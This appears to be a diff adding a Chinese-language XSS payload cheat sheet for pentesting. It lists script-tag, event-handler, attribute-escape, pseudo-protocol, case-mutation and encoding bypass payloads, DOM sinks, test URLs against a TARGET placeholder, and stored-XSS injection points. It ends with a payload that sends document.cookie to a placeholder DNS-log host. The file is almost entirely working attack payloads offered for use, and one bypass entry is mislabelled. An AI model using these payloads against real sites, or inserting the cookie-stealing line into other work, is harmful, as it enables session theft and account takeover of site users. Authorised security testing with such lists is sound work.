@@ -1,0 +1,68 @@
+# XSS 载荷库
+# 反射 / 存储 / DOM 全覆盖
+
+## 基础验证
+<script>alert(1)</script>
+<script>alert(document.domain)</script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<details open ontoggle=alert(1)>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<marquee onstart=alert(1)>
+<isindex action=javascript:alert(1) type=image>
+
+## 属性逃逸
+" onmouseover="alert(1)
+' onmouseover='alert(1)
+" autofocus onfocus="alert(1)
+"><script>alert(1)</script>
+'><img src=x onerror=alert(1)>
+
+## 伪协议
+javascript:alert(1)
+javascript:alert(document.cookie)
+data:text/html,<script>alert(1)</script>
+vbscript:msgbox(1)
+
+## 无括号 / 无引号绕过
+<script>alert`1`</script>
+<script>alert(1)</script>  # 用 String.fromCharCode
+<img src=x onerror=alert(1)>
+<img src=x onerror=eval(name)>
+
+## 大小写 / 标签变形绕过
+<ScRiPt>alert(1)</sCrIpT>
+<scr<script>ipt>alert(1)</script>
+<img src=x onerror="alert(1)">
+<img/src=x/onerror=alert(1)>
+<svg><script>alert&#40;1&#41;</script></svg>
+
+## 编码绕过
+&#60;script&#62;alert(1)&#60;/script&#62;      # HTML 实体
+%3Cscript%3Ealert(1)%3C/script%3E            # URL 编码
+\u003cscript\u003ealert(1)\u003c/script\u003e  # JS Unicode
+<scr\x00ipt>alert(1)</scr\x00ipt>
+
+## DOM XSS 触发点
+# 常见 sink
+location.hash / location.search / document.referrer
+innerHTML / outerHTML / document.write / eval / setTimeout
+
+# 测试 URL
+https://TARGET/#<img src=x onerror=alert(1)>
+https://TARGET/?q=<img src=x onerror=alert(1)>
+
+## 存储型验证（提交后重新访问页面）
+# 常见注入点：昵称、评论、个人简介、文件名、工单标题、反馈内容
+# 验证：提交后打开列表页/详情页，看是否执行
+
+## Cookie 窃取（仅证明可获取，不要真发给第三方）
+<script>new Image().src="http://YOUR_DNSLOG/x?c="+document.cookie</script>
+# 更稳妥：直接 alert(document.domain) 证明执行即可
